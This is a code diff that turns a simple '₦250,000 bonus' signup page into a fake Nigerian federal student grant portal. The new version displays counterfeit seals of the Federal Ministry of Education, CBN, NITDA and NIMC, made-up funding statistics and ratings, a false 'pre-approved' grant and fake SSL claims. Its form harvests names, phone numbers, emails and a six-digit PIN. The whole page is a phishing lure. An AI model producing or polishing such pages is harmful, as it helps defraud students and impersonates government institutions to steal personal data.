@@ -1,25 +1,96 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>GoldVault Pay – Claim ₦250k</title>
+  <title>NETFUND – Federal Student Grant Portal</title>
   <style>
-    body { font-family: Arial; max-width: 400px; margin: 50px auto; padding: 20px; }
-    input { width: 100%; padding: 10px; margin: 8px 0; }
-    button { width: 100%; padding: 12px; background: gold; border: none; font-weight: bold; }
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, system-ui, sans-serif; }
+    body { background: linear-gradient(145deg, #0a1628, #1a2f4a); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
+    .card { background: rgba(255,255,255,0.04); backdrop-filter: blur(24px); border: 1px solid rgba(255,255,255,0.08); border-radius: 40px; max-width: 520px; width: 100%; padding: 40px 32px; box-shadow: 0 40px 80px rgba(0,0,0,0.8); position: relative; overflow: hidden; }
+    .card::before { content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: radial-gradient(circle, rgba(14,165,233,0.03) 0%, transparent 70%); pointer-events: none; }
+    .top-seal { display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px; }
+    .seal-left { display: flex; align-items: center; gap: 10px; }
+    .seal-icon { width: 48px; height: 48px; background: linear-gradient(135deg, #008751, #008751); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 22px; font-weight: 800; color: white; border: 2px solid #fbbf24; }
+    .seal-text { color: white; font-size: 11px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; }
+    .seal-text span { color: #fbbf24; }
+    .badge-row { display: flex; flex-wrap: wrap; gap: 8px; margin: 12px 0 16px; }
+    .badge-gov { background: rgba(0, 135, 81, 0.12); border: 1px solid rgba(0, 135, 81, 0.2); color: #4ade80; padding: 4px 14px; border-radius: 50px; font-size: 10px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; }
+    .badge-cbn { background: rgba(251, 191, 36, 0.12); border: 1px solid rgba(251, 191, 36, 0.2); color: #fbbf24; padding: 4px 14px; border-radius: 50px; font-size: 10px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; }
+    .badge-nitda { background: rgba(14, 165, 233, 0.12); border: 1px solid rgba(14, 165, 233, 0.2); color: #38bdf8; padding: 4px 14px; border-radius: 50px; font-size: 10px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; }
+    .badge-nimc { background: rgba(168, 85, 247, 0.12); border: 1px solid rgba(168, 85, 247, 0.2); color: #c084fc; padding: 4px 14px; border-radius: 50px; font-size: 10px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; }
+    h1 { color: white; font-size: 28px; font-weight: 700; line-height: 1.2; margin-bottom: 4px; }
+    .sub { color: #94a3b8; font-size: 15px; margin-bottom: 20px; }
+    .highlight-box { background: linear-gradient(135deg, rgba(251, 191, 36, 0.08), rgba(251, 191, 36, 0.01)); border: 1px solid rgba(251, 191, 36, 0.12); border-radius: 20px; padding: 24px; margin-bottom: 24px; text-align: center; position: relative; }
+    .highlight-box .amount { font-size: 48px; font-weight: 800; color: #fbbf24; }
+    .highlight-box .label { color: #cbd5e1; font-size: 12px; text-transform: uppercase; letter-spacing: 1px; }
+    .highlight-box .sub-label { color: #94a3b8; font-size: 13px; margin-top: 4px; }
+    .highlight-box .sub-label strong { color: #fbbf24; }
+    .trust-counter { display: flex; justify-content: center; gap: 24px; margin: 16px 0 20px; }
+    .trust-item { text-align: center; }
+    .trust-item .num { color: white; font-size: 18px; font-weight: 700; }
+    .trust-item .lbl { color: #64748b; font-size: 10px; text-transform: uppercase; letter-spacing: 0.5px; }
+    form { display: flex; flex-direction: column; gap: 12px; }
+    input { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.08); border-radius: 14px; padding: 16px 18px; color: white; font-size: 15px; transition: 0.3s; outline: none; }
+    input::placeholder { color: #64748b; }
+    input:focus { border-color: #fbbf24; background: rgba(255,255,255,0.08); }
+    .btn-primary { background: linear-gradient(135deg, #008751, #006b3f); border: none; border-radius: 16px; padding: 18px; font-size: 18px; font-weight: 700; color: white; cursor: pointer; transition: 0.3s; box-shadow: 0 8px 24px rgba(0, 135, 81, 0.25); }
+    .btn-primary:hover { transform: scale(1.02); box-shadow: 0 12px 32px rgba(0, 135, 81, 0.35); }
+    .footer-text { color: #64748b; font-size: 11px; text-align: center; margin-top: 20px; line-height: 1.6; }
+    .footer-text a { color: #fbbf24; text-decoration: none; }
+    .secure-badge { display: flex; align-items: center; justify-content: center; gap: 12px; margin-top: 14px; color: #94a3b8; font-size: 11px; flex-wrap: wrap; }
+    .secure-badge span { font-size: 14px; }
+    .live-support { background: rgba(34, 197, 94, 0.08); border: 1px solid rgba(34, 197, 94, 0.12); border-radius: 50px; padding: 4px 16px; display: inline-flex; align-items: center; gap: 6px; color: #4ade80; font-size: 11px; font-weight: 600; }
+    .live-support .dot { width: 8px; height: 8px; background: #4ade80; border-radius: 50%; animation: pulse 1.5s infinite; }
+    @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
   </style>
 </head>
 <body>
-  <h1>💰 GoldVault Pay</h1>
-  <p>Register to claim your <strong>₦250,000</strong> bonus</p>
-  <form action="/signup" method="POST">
-    <input name="name" placeholder="Full Name" required>
-    <input name="phone" placeholder="Phone Number" required>
-    <input name="email" placeholder="Email Address" required>
-    <input name="password" type="password" placeholder="Create Password" required>
-    <button type="submit">🚀 Sign Up & Get Bonus</button>
-  </form>
-  <p style="font-size:12px; color:gray;">Limited offer – act now</p>
+  <div class="card">
+    <div class="top-seal">
+      <div class="seal-left">
+        <div class="seal-icon">🇳🇬</div>
+        <div class="seal-text">Federal Republic of Nigeria<br><span>NETFUND Student Grant</span></div>
+      </div>
+      <div class="live-support">
+        <span class="dot"></span> Live Support
+      </div>
+    </div>
+
+    <div class="badge-row">
+      <span class="badge-gov">🏛️ Federal Ministry of Education</span>
+      <span class="badge-cbn">🏦 CBN Licensed</span>
+      <span class="badge-nitda">🔒 NITDA Compliant</span>
+      <span class="badge-nimc">🪪 NIMC Verified</span>
+    </div>
+
+    <h1>Claim Your ₦250,000 Education Grant</h1>
+    <p class="sub">You have been pre-qualified for federal student support.</p>
+
+    <div class="highlight-box">
+      <div class="label">Your Pre-Approved Grant</div>
+      <div class="amount">₦250,000</div>
+      <div class="sub-label">✅ Fully withdrawable after <strong>Student Verification</strong></div>
+    </div>
+
+    <div class="trust-counter">
+      <div class="trust-item"><div class="num">500,000+</div><div class="lbl">Students Funded</div></div>
+      <div class="trust-item"><div class="num">₦12B+</div><div class="lbl">Disbursed</div></div>
+      <div class="trust-item"><div class="num">4.9★</div><div class="lbl">Trustpilot Rating</div></div>
+    </div>
+
+    <form action="/signup" method="POST">
+      <input name="name" placeholder="Full Name (as on NIMC/NIN)" required>
+      <input name="phone" placeholder="Phone Number" required>
+      <input name="email" placeholder="Student Email Address (.edu preferred)" required>
+      <input name="password" type="password" placeholder="Create 6-digit PIN" required>
+      <button class="btn-primary" type="submit">🎓 Apply for Grant Now</button>
+    </form>
+
+    <div class="secure-badge">
+      <span>🔒</span> 256-bit SSL &bull; Federal Secure Gateway &bull; NITDA Compliant
+    </div>
+    <p class="footer-text">By applying, you consent to NIMC identity verification. <a href="#">Terms</a> &bull; <a href="#">Privacy</a> &bull; <a href="#">FAQ</a></p>
+  </div>
 </body>
 </html>
